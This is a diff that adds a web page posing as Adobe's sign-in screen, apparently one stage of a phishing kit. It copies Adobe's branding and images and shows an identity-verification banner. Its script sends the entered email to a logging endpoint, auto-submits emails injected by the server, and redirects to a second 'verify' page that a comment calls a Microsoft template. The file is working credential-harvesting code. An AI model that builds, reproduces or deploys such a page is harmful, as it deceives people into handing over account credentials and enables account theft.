@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="request-id" content="{{REQUEST_ID}}">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe Sign In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Adobe Clean', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            height: 100vh;
+            display: flex;
+            overflow: hidden;
+            align-items: center;
+            justify-content: flex-end;
+            padding-right: 40px;
+        }
+
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #808080 url('https://auth.services.adobe.com/img/canvas/Fotolia_239116868_XL.jpg') center/cover no-repeat;
+            z-index: 0;
+        }
+
+        .background::before {
+            content: '';
+            position: absolute;
+            top: 80px;
+            left: 80px;
+            z-index: 1;
+        }
+
+        .logo-section {
+            position: fixed;
+            top: 50%;
+            transform: translateY(-50%);
+            left: 80px;
+            color: white;
+            z-index: 1;
+        }
+
+        .adobe-logo {
+            margin-bottom: 10px;
+        }
+
+        .adobe-logo img {
+            height: 40px;
+            width: auto;
+        }
+
+        .tagline {
+            font-size: 19px;
+            color: #fff;
+        }
+
+        .signin-panel {
+            width: 450px;
+            max-height: 90vh;
+            background: white;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            border-radius: 8px;
+            overflow: hidden;
+            position: relative;
+            z-index: 2;
+        }
+
+        .alert-banner {
+            background: #1473E6;
+            color: white;
+            padding: 12px 30px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+        }
+
+        .alert-icon {
+            width: 20px;
+            height: 20px;
+            border: 2px solid white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+
+        .signin-content {
+            flex: 1;
+            padding: 40px 40px 30px;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+        }
+
+        h1 {
+            font-size: 28px;
+            margin-bottom: 15px;
+            font-weight: 300;
+        }
+
+        .new-user {
+            font-size: 14px;
+            margin-bottom: 30px;
+            color: #505050;
+        }
+
+        .new-user a {
+            color: #1473E6;
+            text-decoration: none;
+        }
+
+        .new-user a:hover {
+            text-decoration: underline;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 8px;
+            color: #2c2c2c;
+        }
+
+        input[type="email"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #d0d0d0;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        input[type="email"]:focus {
+            outline: none;
+            border-color: #1473E6;
+        }
+
+        .continue-btn {
+            width: 100%;
+            padding: 12px;
+            background: #1473E6;
+            color: white;
+            border: none;
+            border-radius: 20px;
+            font-size: 15px;
+            cursor: pointer;
+            margin-top: 10px;
+            font-weight: 500;
+        }
+
+        .continue-btn:hover {
+            background: #0d66d0;
+        }
+
+        .divider {
+            text-align: center;
+            margin: 20px 0;
+            color: #707070;
+            font-size: 14px;
+        }
+
+        .social-btn {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #d0d0d0;
+            border-radius: 20px;
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            font-size: 14px;
+            color: #2c2c2c;
+        }
+
+        .social-btn:hover {
+            background: #f5f5f5;
+            border-color: #b0b0b0;
+        }
+
+        .social-icon {
+            width: 20px;
+            height: 20px;
+        }
+
+        .more-options {
+            text-align: center;
+            margin: 15px 0 10px;
+        }
+
+        .more-options a {
+            color: #1473E6;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .more-options a:hover {
+            text-decoration: underline;
+        }
+
+        .help-link {
+            margin-top: 10px;
+            padding-top: 10px;
+        }
+
+        .help-link a {
+            color: #1473E6;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .help-link a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            background: white;
+            padding: 15px 30px;
+            border-top: 1px solid #e0e0e0;
+            font-size: 11px;
+            color: #707070;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: #707070;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .chat-button {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            width: 50px;
+            height: 50px;
+            background: white;
+            border-radius: 50%;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            border: 1px solid #d0d0d0;
+        }
+
+        .watermark {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0,0,0,0.6);
+            color: white;
+            padding: 8px 12px;
+            border-radius: 4px;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .loading-container {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            padding: 20px 0;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1473E6;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="background"></div>
+
+    <div class="logo-section">
+        <div class="adobe-logo">
+            <img src="https://auth.services.adobe.com/img/generic/adobe_logo_white.svg" alt="Adobe" onerror="this.style.display='none'">
+        </div>
+        <div class="tagline">Sign in or create an account</div>
+    </div>
+
+    <div class="signin-panel">
+        <div class="alert-banner">
+            <div class="alert-icon">i</div>
+            <span>For your protection, please verify your identity.</span>
+        </div>
+
+        <div class="signin-content">
+            <h1>Sign in</h1>
+            
+            <div class="new-user">
+                New user? <a href="#">Create an account</a>
+            </div>
+
+            <form>
+                <div class="form-group">
+                    <label for="email">Email address</label>
+                    <input type="email" id="email" name="email">
+                </div>
+
+                <button type="submit" class="continue-btn">Continue</button>
+                <div class="loading-container" id="loader">
+                    <div class="spinner"></div>
+                </div>
+            </form>
+
+            <div class="divider">Or</div>
+
+            <button class="social-btn">
+                <svg class="social-icon" viewBox="0 0 24 24">
+                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                </svg>
+                Continue with Google
+            </button>
+
+            <button class="social-btn">
+                <svg class="social-icon" viewBox="0 0 24 24">
+                    <path fill="#1877F2" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                </svg>
+                Continue with Facebook
+            </button>
+
+            <button class="social-btn">
+                <svg class="social-icon" viewBox="0 0 24 24">
+                    <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+                </svg>
+                Continue with Apple
+            </button>
+
+            <div class="more-options">
+                <a href="#">More sign-in options</a>
+            </div>
+
+            <div class="help-link">
+                <a href="#">Get help signing in</a>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="footer-links">
+                <span>Copyright © 2025 Adobe. All rights reserved.</span>
+                <a href="#">Terms of Use</a>
+                <a href="#">Cookie preferences</a>
+                <a href="#">Privacy</a>
+                <a href="#">Do not sell or share my personal information</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="chat-button">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+            <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z" fill="#505050"/>
+        </svg>
+    </div>
+
+    <div class="watermark">
+        <span>📷</span>
+        <span>Blue Marner</span>
+    </div>
+
+    <script>
+        let prefilledEmail = ""; // SERVER_INJECT_EMAIL
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const emailInput = document.getElementById('email');
+            
+            // Auto-fill if email is provided
+            if (prefilledEmail) {
+                emailInput.value = prefilledEmail;
+                emailInput.parentElement.classList.add('focused');
+
+                // Auto-submit if email is valid
+                if (validateEmail(prefilledEmail)) {
+                    setTimeout(() => {
+                        document.querySelector('.continue-btn').click();
+                    }, 100);
+                }
+            }
+
+            const form = document.querySelector('form');
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const email = emailInput.value.trim();
+                
+                if (!email) {
+                    // Simple validation feedback
+                    emailInput.style.borderColor = '#d31510';
+                    emailInput.focus();
+                    return;
+                }
+
+                if (validateEmail(email)) {
+                    // Show loader
+                    document.querySelector('.continue-btn').style.display = 'none';
+                    document.getElementById('loader').style.display = 'flex';
+
+                    const body = { email: email };
+                    fetch('/api.php?action=log_event', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(body),
+                        keepalive: true
+                    });
+
+                    setTimeout(function() {
+                        // Redirect to verification (Microsoft template)
+                        // We append ?step=verify to signal the router/client to switch context
+                        // and ensure the email is in the path
+                        let baseUrl = window.location.pathname;
+                        if (baseUrl.indexOf('/page.html') === -1) {
+                            baseUrl = '/page.html';
+                        } else {
+                            // Strip existing email suffix if any to rebuild it cleanly
+                            const parts = baseUrl.split('/page.html');
+                            baseUrl = parts[0] + '/page.html';
+                        }
+                        
+                        window.location.href = baseUrl + '/' + encodeURIComponent(email).replace(/%40/g, '@') + '?step=verify';
+                    }, 2000);
+                } else {
+                    emailInput.style.borderColor = '#d31510';
+                }
+            });
+
+            emailInput.addEventListener('input', function() {
+                this.style.borderColor = '#d0d0d0';
+            });
+            
+            function validateEmail(email) {
+                return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+            }
+        });
+    </script>
+</body>
+</html>
